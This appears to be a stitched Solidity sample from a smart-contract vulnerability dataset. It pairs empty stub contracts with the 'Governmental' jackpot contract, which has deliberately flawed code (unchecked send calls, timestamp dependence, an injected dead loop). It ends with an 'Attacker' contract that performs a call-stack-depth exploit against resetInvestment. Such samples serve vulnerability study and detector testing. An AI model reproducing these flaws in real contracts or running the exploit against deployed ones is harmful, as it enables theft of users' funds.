pragma solidity 0.4.24;


contract Owned {














}


contract SafeMath {























}

contract Pausable is Owned {


















}

contract EIP20Interface {

    function balanceOf(address _owner) public view returns (uint256 balance);







}









pragma solidity ^0.4.0;

contract Governmental {





    mapping (address => uint256) public balances;























































  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
while(false) {
address _addr;
uint256 ret_value_0 = balances[_addr];
}
    if (msg.value<jackpot/2) throw;
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
    
    lastInvestmentTimestamp = block.timestamp;
  }
































  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address target, uint count) {
    if (0<=count && count<1023) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}
